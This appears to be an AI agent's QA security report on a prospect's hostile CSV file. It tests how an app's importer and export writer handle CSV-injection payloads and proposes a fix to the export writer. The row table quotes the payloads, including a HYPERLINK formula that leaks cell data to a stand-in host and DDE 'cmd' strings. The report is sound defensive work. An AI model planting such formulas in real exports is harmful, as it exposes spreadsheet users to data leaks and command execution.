# Task 3: hostile CSV from a prospect (`instructions-from-prospect.csv`)

To: delivery-specialist, cc Aashmiin. From: qa-security-engineer, 2026-10-31.

**Short answer**
- **Importing it is safe for the app.** I proved the importer rejects or stores each payload as inert text. But don't import it into the prospect's trial: 7 of its 14 rows are attack payloads, and 7 junk records with formula-shaped IDs would sit in their inbox.
- **Don't send the reconciled export back yet.** Our CSV writer neutralises `= + - @`, tab and CR, but it passes two of the accepted payloads through unchanged: a full-width `＝` and a zero-width-space-prefixed `=`. I couldn't prove what Excel does with those. A small qa-fix (below) closes the gap; I proved it in scratch.

## What I ran
- File checks [VERIFIED]: SHA-256 `b6a6909d…07ac2e`. UTF-8. **15 CRLF plus 1 bare LF**: the README says CRLF, and the bare LF is the one inside the quoted `tx_hash` cell of INS-3012. One U+200B, one U+FF1D, one tab.
- A scratch server from `origin/main` @ `8decb27`, `DEMO_MODE=off` (the trial set-up; imports refuse when `DEMO_MODE=1`), on an empty temp data dir, local only.
- `POST /api/payments/imports/instruction` with `mappingId=instructions-standard` → **HTTP 200, outcome `imported`, 7 accepted, 7 rejected**, audit row `payments.import` with the file's SHA-256.
- Then `GET /api/payments/export.csv?actor=QA probe` → 200, 7 payment rows. Raw bytes checked with `cat -A`.
- Logs: `/tmp/claude-0/ho-logs/t3-import.json`, `t3-export.csv`. Scratch server stopped, data dir deleted.

## Row by row (line = physical line in the file; header = 1)
| Line | Payload | Import | Stored / shown | Export cell (bytes seen) | Neutralised? |
|---|---|---|---|---|---|
| 2 | INS-3001, 250.00 USDC | accepted | normal record | `INS-3001` | n/a (benign) |
| 3 | `=HYPERLINK("https://example.invalid/?leak="&A1,"Open")` as instruction_id | **accepted** | stored as text | `"'=HYPERLINK(""https://example.invalid/?leak=""&A1,""Open"")"` | yes: `'` prefix + quoted |
| 4 | ` =1+1` (leading space) | **rejected**: "Has leading or trailing spaces." | not stored | none | n/a |
| 5 | `＝1+1` (full-width U+FF1D) | **accepted** | stored | `＝1+1` (unchanged) | **no** |
| 6 | U+200B + `=1+1` | **accepted** | stored | U+200B`=1+1` (unchanged) | **no** |
| 7 | tab + `=cmd\|' /C echo FICTIONAL'!A0` (DDE) | **rejected**: leading/trailing spaces | not stored | none | n/a |
| 8 | `@SUM(1+1)*cmd\|' /C echo FICTIONAL'!A0` | **accepted** | stored | `'@SUM(1+1)*cmd\|' /C …` | yes: `'` prefix |
| 9 | `-2+3+cmd\|' /C echo FICTIONAL'!A0` | **accepted** | stored | `'-2+3+cmd\|' /C …` | yes: `'` prefix |
| 10 | amount `=1+1` | **rejected**: "Not an exact decimal" | not stored | none | n/a |
| 11 | amount `-17.00` | **rejected** (no sign allowed) | not stored | none | n/a |
| 12 | amount `1e3` | **rejected** (no exponent) | not stored | none | n/a |
| 13–14 | INS-3012, tx_hash + newline + `=1+1` | **rejected**: "Not a transaction hash" | not stored | none | n/a |
| 15 | `ops@example.com` as instruction_id | **rejected**: "Looks like an email address…" (PII guard) | not stored | none | n/a |
| 16 | INS-3014, provider_payment_id `+cmd` | **accepted** | stored in `payments.json`; inbox text "The instruction names provider payment +cmd" (React-escaped on screen) | `INS-3014`; the provider column is empty, because it comes from provider records | not exported today. If a provider record matched, `csvCell` would emit `'+cmd` [ASSUMPTION from code path] |

Each accepted row also opened 2 inbox exceptions (missing provider leg, overdue). There is no per-record delete: `payments/clear` removes **all** imported records.

## What I proved, and what needs a real spreadsheet
**Proven** [VERIFIED]:
- Which rows the real importer accepts and rejects, and why.
- That nothing is executed server-side: values are stored as JSON strings and rendered by React.
- The exact bytes the real export writes for each accepted payload.
- That `csvCell` (`src/lib/csv/cell.ts:9`) misses full-width `＝＋－＠`, zero-width/BOM/space-prefixed formulas, and doesn't quote cells containing `;` (G8). My unit test failed 9 of 10 on main.

**Not proven: needs a spreadsheet in a disposable VM, never a real machine.** No spreadsheet exists in this session.
- Whether Excel, LibreOffice or Google Sheets evaluate `＝1+1` or U+200B`=1+1`. OWASP lists full-width signs as a risk [VERIFIED: qa-security-engineer 2026-10-29, OWASP CSV Injection].
- Whether the `'` prefix holds after save-and-reopen in Excel. OWASP warns it may not [same source].
- Whether DDE prompts appear.
- How `;`-separated locales split the `'@SUM…` and `'-2+3…` cells.

## Recommendation
1. **Don't import this file into the prospect's trial.** Reply (draft, delivery-specialist; customer-facing, so Aashmiin approves in the 07:30 queue): we tested the file in an isolated copy. 7 rows were refused by validation and the rest were stored as plain text. Please send a real instruction export for the trial.
2. **Don't send a reconciled export of this file back** until the qa-fix below merges. Even then, advise the controller to open it with Data → From Text/CSV, columns as Text, rather than double-clicking.
3. **Product (proposal, for crypto-protocol-engineer and Aashmiin to decide):** should the importer reject identifiers that start with a formula character? It already rejects leading spaces and emails. That is a product decision, so it isn't in the qa-fix.

## qa-fix PR plan (WOULD OPEN PR; not opened)
- **Branch**: `qa-fix/main-20261031` from `origin/main` @ `8decb27`, PR into `main`. The writer only exists on `main`; there is no failing feature branch. Aashmiin merges.
- **Title**: `qa-fix: CSV writer neutralises full-width and hidden-prefix formulas, quotes ";" (csvCell hostile cells)`
- **Test first**: `tests/csv-cell-hostile.test.ts` (18 lines). It covers `＝1+1`, `＋1`, `－1`, `＠SUM(1)`, U+200B`=1+1`, U+FEFF`=1+1`, ` =1+1`, NBSP`=1+1`, and `a;=1+1` must be quoted. A guard test checks that `-17.00` stays a number and `INS-3001` and `=1+1 → '=1+1` are unchanged. **Before the fix: 9 failed, 1 passed** [VERIFIED `t3-before.log`].
- **Fix** (`src/lib/csv/cell.ts`, +3/−2):
  ```ts
  if (/^[\s​-‏⁠﻿]*[=+\-@＝＋－＠\t\r]/.test(s)) s = `'${s}`;
  return /[",;\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
  ```
- **After**:
  - 10/10 passed.
  - `npx tsc --noEmit` exit 0.
  - `npx vitest run` ×3 identical: **572 passed, 57 skipped (629)**.
  - `npx next build` exit 0 [VERIFIED `t3-after.log`, `t3-fix-vitest-{1,2,3}.log`, `t3-fix-build.log`].
  - No existing test changed or loosened.
  - About 23 lines in total.
- **Risk**: cells containing `;` are now quoted. That is valid CSV, but byte-level diffs of exports change. The bulk export uses the same writer and inherits the fix.

WOULD WRITE (Log): `qa-security-engineer | hostile CSV review (prospect file) | import 7 accepted / 7 rejected; export: 2 payloads not neutralised (full-width ＝, U+200B=) | qa-fix plan qa-fix/main-20261031; reply to prospect drafted for Aashmiin's approval`. Product roadmap `bug` row: "csvCell misses full-width / hidden-prefix formulas and ';' (G8)".
